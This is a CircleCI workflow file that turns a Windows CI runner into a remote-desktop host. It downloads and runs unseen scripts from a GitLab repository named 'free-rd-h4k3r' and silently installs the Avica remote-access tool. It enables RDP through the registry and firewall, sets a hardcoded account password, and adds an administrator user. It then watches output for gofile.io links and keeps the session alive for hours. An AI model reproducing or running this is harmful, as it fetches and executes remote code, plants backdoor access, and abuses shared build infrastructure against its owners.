version: 2.1
orbs:
  win: circleci/windows@5.0
jobs:
  build:
    executor:
      name: win/default
      size: medium
    
    steps:
      - run:
          name: Debug Setup with Verbose Output
          shell: powershell.exe
          no_output_timeout: 45m  # Increased timeout
          command: |
            Write-Host "ðŸš€ Starting debug setup..." -ForegroundColor Green
            
            # Show environment info
            Write-Host "ðŸ” Environment Info:" -ForegroundColor Cyan
            Write-Host "User: $env:USERNAME"
            Write-Host "Computer: $env:COMPUTERNAME" 
            Write-Host "Python Version:" -NoNewline
            python --version
            
            # Download files with error checking
            Write-Host "`nðŸ“¥ Downloading files..." -ForegroundColor Yellow
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/free-rd-h4k3r/-/raw/main/setup.py" -OutFile "setup.py"
                Write-Host "âœ… setup.py downloaded ($(Get-Item setup.py | Select-Object -ExpandProperty Length) bytes)"
            } catch {
                Write-Host "âŒ Failed to download setup.py: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            try {
                Write-Host "Downloading Avica (this may take a while)..."
                Invoke-WebRequest -Uri "https://download.avica.com/AvicaLite_v8.0.8.9.exe" -OutFile "Avica_setup.exe" -TimeoutSec 300
                Write-Host "âœ… Avica_setup.exe downloaded ($(Get-Item Avica_setup.exe | Select-Object -ExpandProperty Length) bytes)"
            } catch {
                Write-Host "âŒ Failed to download Avica: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "Trying alternative Avica download..."
                try {
                    Invoke-WebRequest -Uri "https://www.avica.com/en/download/windows" -OutFile "avica_page.html"
                    Write-Host "âš ï¸ Could not download Avica directly, setup will continue without it" -ForegroundColor Yellow
                } catch {
                    Write-Host "âš ï¸ Alternative download also failed, continuing..." -ForegroundColor Yellow
                }
            }
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/my-rdp/-/raw/main/show.bat" -OutFile "show.bat"
                Write-Host "âœ… show.bat downloaded"
            } catch {
                Write-Host "âŒ Failed to download show.bat: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            try {
                Invoke-WebRequest -Uri "https://gitlab.com/userup908/my-rdp/-/raw/main/loop.bat" -OutFile "loop.bat" 
                Write-Host "âœ… loop.bat downloaded"
            } catch {
                Write-Host "âŒ Failed to download loop.bat: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            # List downloaded files
            Write-Host "`nðŸ“ Downloaded Files:"
            Get-ChildItem -Filter "*.py" | ForEach-Object {
                $size = $_.Length
                Write-Host "  $($_.Name) ($size bytes)" -ForegroundColor Cyan
            }
            Get-ChildItem -Filter "*.exe" | ForEach-Object {
                $size = $_.Length
                Write-Host "  $($_.Name) ($size bytes)" -ForegroundColor Cyan
            }
            Get-ChildItem -Filter "*.bat" | ForEach-Object {
                $size = $_.Length
                Write-Host "  $($_.Name) ($size bytes)" -ForegroundColor Cyan
            }
            
            # Install packages with verbose output
            Write-Host "`nðŸ“¦ Installing Python packages..." -ForegroundColor Yellow
            Write-Host "Installing requests..."
            python.exe -m pip install requests --quiet --no-warn-script-location
            Write-Host "Installing Pillow..."
            python.exe -m pip install Pillow --quiet --no-warn-script-location
            Write-Host "Installing pyautogui..."
            python.exe -m pip install pyautogui --quiet --no-warn-script-location
            Write-Host "Installing telegraph..."
            python.exe -m pip install telegraph --quiet --no-warn-script-location
            Write-Host "âœ… All packages installed"
            
            # Enable RDP
            Write-Host "`nðŸ”§ Enabling RDP..." -ForegroundColor Yellow
            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
            Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
            Write-Host "âœ… RDP enabled"
            
            # User setup
            Write-Host "`nðŸ‘¤ Setting up users..." -ForegroundColor Yellow
            $currentUser = $env:USERNAME
            Write-Host "Current user: $currentUser"
            
            net user $currentUser TheDisa1a 2>$null
            Write-Host "âœ… Password set for $currentUser"
            
            net user runneradmin TheDisa1a /add 2>$null
            if ($LASTEXITCODE -eq 0) {
                net localgroup administrators runneradmin /add 2>$null
                Write-Host "âœ… runneradmin user created and added to administrators"
            } else {
                Write-Host "âš ï¸ Could not create runneradmin user (this is normal in CircleCI)" -ForegroundColor Yellow
            }
            
            # Start Avica installation
            Write-Host "`nâš¡ Starting Avica installation..." -ForegroundColor Yellow
            if (Test-Path "Avica_setup.exe") {
                try {
                    $avicaProcess = Start-Process "Avica_setup.exe" -ArgumentList "/S" -PassThru -NoNewWindow
                    Write-Host "âœ… Avica process started (PID: $($avicaProcess.Id))"
                    
                    # Wait longer for installation
                    Write-Host "â³ Waiting for Avica installation (60 seconds)..."
                    Start-Sleep -Seconds 60
                    
                    # Check if Avica is running
                    $avicaRunning = Get-Process | Where-Object {$_.ProcessName -like "*avica*"}
                    if ($avicaRunning) {
                        Write-Host "âœ… Avica processes found:" -ForegroundColor Green
                        $avicaRunning | Select-Object ProcessName, Id | Format-Table
                    } else {
                        Write-Host "âš ï¸ No Avica processes found yet" -ForegroundColor Yellow
                    }
                } catch {
                    Write-Host "âŒ Error starting Avica: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "âš ï¸ Avica_setup.exe not found, skipping installation" -ForegroundColor Yellow
            }
            
            # Run setup.py with much longer timeout and real-time output
            Write-Host "`nðŸ Running setup.py..." -ForegroundColor Yellow
            if (Test-Path "setup.py") {
                try {
                    $env:PYTHONUNBUFFERED = "1"
                    Write-Host "Executing: python setup.py"
                    
                    # Use Start-Process instead of job for real-time output
                    $psi = New-Object System.Diagnostics.ProcessStartInfo
                    $psi.FileName = "python"
                    $psi.Arguments = "setup.py"
                    $psi.RedirectStandardOutput = $true
                    $psi.RedirectStandardError = $true
                    $psi.UseShellExecute = $false
                    $psi.CreateNoWindow = $true
                    
                    $process = New-Object System.Diagnostics.Process
                    $process.StartInfo = $psi
                    $process.Start() | Out-Null
                    
                    # Read output in real-time
                    $timeout = 1200 # 20 minutes
                    $timer = [System.Diagnostics.Stopwatch]::StartNew()
                    
                    while (!$process.HasExited -and $timer.Elapsed.TotalSeconds -lt $timeout) {
                        if (!$process.StandardOutput.EndOfStream) {
                            $line = $process.StandardOutput.ReadLine()
                            if ($line) {
                                Write-Host "  $line" -ForegroundColor White
                                # Look for GoFile link in output
                                if ($line -match "gofile\.io") {
                                    Write-Host "ðŸŽ‰ FOUND GOFILE LINK: $line" -ForegroundColor Green -BackgroundColor Black
                                }
                            }
                        }
                        Start-Sleep -Milliseconds 100
                    }
                    
                    if (!$process.HasExited) {
                        Write-Host "âš ï¸ Process timed out after $timeout seconds" -ForegroundColor Yellow
                        $process.Kill()
                    } else {
                        Write-Host "âœ… setup.py completed with exit code: $($process.ExitCode)" -ForegroundColor Green
                    }
                    
                    $timer.Stop()
                    
                } catch {
                    Write-Host "âŒ Error running setup.py: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "âŒ setup.py file not found!" -ForegroundColor Red
            }
            
            # Check show.bat for GoFile link
            Write-Host "`nðŸ” Checking show.bat for GoFile link..." -ForegroundColor Cyan
            if (Test-Path "show.bat") {
                $showContent = Get-Content "show.bat"
                $gofileLines = $showContent | Where-Object { $_ -match "gofile\.io" }
                if ($gofileLines) {
                    Write-Host "ðŸŽ‰ GOFILE LINKS FOUND IN show.bat:" -ForegroundColor Green -BackgroundColor Black
                    $gofileLines | ForEach-Object {
                        Write-Host "  $_" -ForegroundColor Yellow
                    }
                } else {
                    Write-Host "âŒ No GoFile links found in show.bat" -ForegroundColor Red
                }
            }
            
            Write-Host "`nðŸŽ‰ Debug setup completed!" -ForegroundColor Green
            
      - run:
          name: Start Services and Keep Active
          shell: cmd.exe
          no_output_timeout: 6h
          command: |
            echo ðŸ”§ Starting services...
            if exist show.bat (
                echo Found show.bat, executing...
                call show.bat
            ) else (
                echo show.bat not found!
            )
            
            echo ðŸš€ Keeping session active...
            if exist loop.bat (
                call loop.bat
            ) else (
                echo loop.bat not found, using simple loop...
                :loop
                timeout /t 300 /nobreak >nul 2>&1
                echo Still running... %time%
                goto loop
            )

workflows:
  version: 2
  rdp-workflow:
    jobs:
      - build